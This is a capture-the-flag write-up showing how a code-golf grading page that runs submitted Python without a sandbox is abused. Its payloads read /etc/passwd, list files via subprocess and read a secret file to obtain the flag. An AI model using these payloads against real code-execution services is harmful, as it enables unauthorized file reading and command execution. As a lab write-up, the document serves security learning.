# shortcode writeup

We are presented with a webpage that asks us to solve a programming exercise:

> In this challenge, you get at most 100 characters to print a square of size n
> with all numbers from 1 to nÂ². The 1 is placed in the upper left corner, and
> the numbers spiral clockwise to the center. Numbers need to be left-padded
> with zeroes. Input will always be valid (a single integer).

Submitting the following code gives this result:

```py
def square(x):
	return str(x)
```

> Wrong: code did not meet the requirements for x = 4: 4

But how would the website actually check whether the output is correct? Of
course it has to run the code *somehow*.

Let's try something...

```py
def square(x):
	return open('/etc/passwd','r').read()
```

> Wrong: code did not meet the requirements for x = 14: root:x:0:0:root:[...]

Looks like it isn't sandboxed at all!

```py
def square(x):
	return __import__('subprocess').check_output(['ls'])
```

> Wrong: code did not meet the requirements for x = 5: b'main.py\nrequirements.txt\nsecret\n'

Well that's certainly useful. But what is in that `secret` file?

```py
def square(x):
	return open('./secret','r').read()
```

> Wrong: code did not meet the requirements for x = 5: FLG{Test flag here}
